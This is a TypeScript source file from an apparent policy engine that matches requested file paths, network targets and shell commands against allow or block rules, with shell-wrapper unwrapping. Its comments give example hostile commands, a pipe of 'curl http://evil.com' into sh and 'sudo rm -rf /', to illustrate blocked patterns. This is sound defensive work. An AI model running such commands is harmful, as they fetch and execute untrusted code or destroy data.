/**
 * Scope matching for the policy engine.
 *
 * Supports four matching strategies based on capability type:
 * - fs.read / fs.write / secrets.read: glob matching (*, **, ?)
 * - net.http: CIDR matching for IP ranges + exact hostname match
 * - proc.spawn: wildcard pattern matching for command strings
 *
 * All implementations are zero-dependency (no external packages).
 */

import type { SkillCapability } from '../types.js'
import { SHELL_WRAPPER_PREFIXES } from '../types.js'

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * Match a requested scope string against a rule scope pattern.
 *
 * Dispatches to the appropriate matching strategy based on the capability:
 * - fs.read, fs.write, secrets.read: glob matching
 * - net.http: CIDR or hostname matching
 * - proc.spawn: wildcard pattern matching
 *
 * @param requested - The scope value being requested (e.g., a file path, IP, command)
 * @param ruleScope - The pattern from the policy rule (e.g., a glob, CIDR, wildcard)
 * @param capability - The capability type, determines which matching strategy to use
 * @returns true if the requested scope matches the rule scope pattern
 */
export function matchScope(
  requested: string,
  ruleScope: string,
  capability: SkillCapability,
): boolean {
  switch (capability) {
    case 'fs.read':
    case 'fs.write':
    case 'secrets.read':
      return matchGlob(requested, ruleScope)

    case 'net.http':
      return matchNetwork(requested, ruleScope)

    case 'proc.spawn':
      return matchPattern(requested, ruleScope)

    default:
      return requested === ruleScope
  }
}

// ---------------------------------------------------------------------------
// Glob matching (minimatch-style, no external deps)
// ---------------------------------------------------------------------------

/**
 * Match a string against a glob pattern.
 *
 * Supported syntax:
 * - `*`  — matches any sequence of characters except `/`
 * - `**` — matches any sequence of characters including `/` (recursive)
 * - `?`  — matches exactly one character (not `/`)
 * - All other characters are matched literally
 *
 * @param str - The string to test
 * @param pattern - The glob pattern
 * @returns true if the string matches the pattern
 */
export function matchGlob(str: string, pattern: string): boolean {
  const regex = globToRegex(pattern)
  return regex.test(str)
}

/**
 * Convert a glob pattern to a RegExp.
 *
 * Escapes regex-special characters, then translates glob tokens:
 * - `**` becomes `.*` (match anything including separators)
 * - `*`  becomes `[^/]*` (match anything except path separator)
 * - `?`  becomes `[^/]` (match single non-separator character)
 */
function globToRegex(pattern: string): RegExp {
  let regexStr = ''
  let i = 0

  while (i < pattern.length) {
    const char = pattern[i]

    if (char === '*') {
      if (pattern[i + 1] === '*') {
        // ** — match anything including path separators
        // Skip optional trailing slash: **/
        regexStr += '.*'
        i += 2
        if (pattern[i] === '/') {
          i++
        }
      } else {
        // * — match anything except path separator
        regexStr += '[^/]*'
        i++
      }
    } else if (char === '?') {
      regexStr += '[^/]'
      i++
    } else if (isRegexSpecial(char)) {
      regexStr += '\\' + char
      i++
    } else {
      regexStr += char
      i++
    }
  }

  return new RegExp('^' + regexStr + '$')
}

/** Characters that must be escaped in a regular expression */
function isRegexSpecial(char: string): boolean {
  return '.+^${}()|[]\\'.includes(char)
}

// ---------------------------------------------------------------------------
// Network matching (CIDR + hostname)
// ---------------------------------------------------------------------------

/**
 * Match a requested network target against a rule scope.
 *
 * Supports:
 * - CIDR notation (e.g., "10.0.0.0/8" matches "10.1.2.3")
 * - Exact IP match (e.g., "169.254.169.254" matches "169.254.169.254")
 * - Exact hostname match (e.g., "localhost" matches "localhost")
 * - IPv6-mapped IPv4 normalization (e.g., "::ffff:127.0.0.1" → "127.0.0.1")
 *
 * @param requested - The target being accessed (IP or hostname)
 * @param ruleScope - The CIDR range, IP, or hostname pattern
 * @returns true if the requested target falls within the rule scope
 */
function matchNetwork(requested: string, ruleScope: string): boolean {
  // Normalize: strip bracket wrappers (e.g. "[::1]" → "::1")
  const normalizedRequested = normalizeNetworkTarget(requested)

  // CIDR notation
  if (ruleScope.includes('/')) {
    return matchCidr(normalizedRequested, ruleScope)
  }

  // Exact match for hostnames and IPs
  const normalizedRule = normalizeNetworkTarget(ruleScope)
  return normalizedRequested === normalizedRule
}

/**
 * Normalize a network target for consistent matching:
 * - Strip bracket wrappers: "[::1]" → "::1"
 * - Convert IPv6-mapped IPv4 to plain IPv4: "::ffff:10.0.0.1" → "10.0.0.1"
 */
function normalizeNetworkTarget(target: string): string {
  // Strip brackets
  let normalized = target.replace(/^\[|\]$/g, '')

  // IPv6-mapped IPv4: ::ffff:A.B.C.D → A.B.C.D
  const mappedMatch = normalized.match(/^::ffff:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$/i)
  if (mappedMatch) {
    normalized = mappedMatch[1]
  }

  return normalized
}

/**
 * Check if an IP address falls within a CIDR range using bit manipulation.
 *
 * Parses both the CIDR network address and the candidate IP into 32-bit
 * unsigned integers, applies the subnet mask, and compares network portions.
 *
 * IPv6 CIDR ranges (containing ':') are compared as exact prefix matches
 * since full IPv6 bit manipulation requires BigInt and is deferred.
 *
 * @param ip - The IP address to check (e.g., "10.1.2.3")
 * @param cidr - The CIDR range (e.g., "10.0.0.0/8")
 * @returns true if the IP falls within the CIDR range
 */
function matchCidr(ip: string, cidr: string): boolean {
  // IPv6 CIDR — simplified prefix match
  if (cidr.includes(':')) {
    const [prefix] = cidr.split('/')
    return ip.startsWith(prefix.replace(/::$/, ''))
  }

  const [network, prefixLenStr] = cidr.split('/')
  const prefixLen = parseInt(prefixLenStr, 10)

  if (isNaN(prefixLen) || prefixLen < 0 || prefixLen > 32) {
    return false
  }

  const ipNum = ipToUint32(ip)
  const networkNum = ipToUint32(network)

  if (ipNum === null || networkNum === null) {
    return false
  }

  // Create the subnet mask: prefixLen leading 1-bits, rest 0
  // Use unsigned right shift to handle the 32-bit boundary correctly
  const mask = prefixLen === 0 ? 0 : (~0 << (32 - prefixLen)) >>> 0

  return (ipNum & mask) >>> 0 === (networkNum & mask) >>> 0
}

/**
 * Parse an IPv4 address string into a 32-bit unsigned integer.
 *
 * @param ip - Dotted-decimal IPv4 address (e.g., "10.1.2.3")
 * @returns The 32-bit unsigned integer representation, or null if invalid
 */
function ipToUint32(ip: string): number | null {
  const parts = ip.split('.')
  if (parts.length !== 4) {
    return null
  }

  let result = 0
  for (const part of parts) {
    const octet = parseInt(part, 10)
    if (isNaN(octet) || octet < 0 || octet > 255) {
      return null
    }
    result = ((result << 8) | octet) >>> 0
  }

  return result
}

// ---------------------------------------------------------------------------
// Pattern matching (process commands)
// ---------------------------------------------------------------------------

/**
 * Match a command string against a wildcard pattern.
 *
 * Supports `*` as a wildcard that matches any sequence of characters.
 * This is intentionally simpler than glob matching — no path separators,
 * no `**`, no `?`.
 *
 * Also detects shell wrappers (e.g., `bash -c "rm -rf /"`) and checks
 * the inner command against the pattern.
 *
 * Examples:
 * - "npm *" matches "npm install", "npm test", "npm run build"
 * - "sudo" matches "sudo" (exact)
 * - "curl * | sh" matches "curl http://evil.com | sh"
 * - "bash -c 'sudo rm -rf /'" matches "sudo" (via shell-wrapper unwrapping)
 *
 * @param command - The command being executed
 * @param pattern - The pattern from the blocked/allowed list
 * @returns true if the command matches the pattern
 */
function matchPattern(command: string, pattern: string): boolean {
  if (matchPatternDirect(command, pattern)) {
    return true
  }

  // Unwrap shell wrappers and check the inner command
  const inner = unwrapShellWrapper(command)
  if (inner && inner !== command) {
    return matchPatternDirect(inner, pattern)
  }

  return false
}

/** Direct pattern match without shell-wrapper unwrapping. */
function matchPatternDirect(command: string, pattern: string): boolean {
  // Exact match shortcut
  if (pattern === command) {
    return true
  }

  // Check if the command starts with the pattern's prefix (for patterns like "sudo")
  // A pattern without wildcards should also match as a prefix when the command
  // starts with it followed by a space (e.g., "sudo" matches "sudo rm -rf")
  if (!pattern.includes('*')) {
    return command === pattern || command.startsWith(pattern + ' ')
  }

  // Convert wildcard pattern to regex
  const regexStr = pattern.split('*').map(escapeRegex).join('.*')

  return new RegExp('^' + regexStr + '$').test(command)
}

/**
 * Unwrap a shell wrapper command to extract the inner command string.
 * E.g., `bash -c "rm -rf /"` → `rm -rf /`
 */
function unwrapShellWrapper(command: string): string | null {
  for (const prefix of SHELL_WRAPPER_PREFIXES) {
    if (command.startsWith(prefix + ' ')) {
      let inner = command.slice(prefix.length + 1).trim()
      // Strip surrounding quotes
      if (
        (inner.startsWith('"') && inner.endsWith('"')) ||
        (inner.startsWith("'") && inner.endsWith("'"))
      ) {
        inner = inner.slice(1, -1)
      }
      return inner.trim()
    }
  }
  return null
}

/**
 * Escape special regex characters in a string.
 */
function escapeRegex(str: string): string {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
}
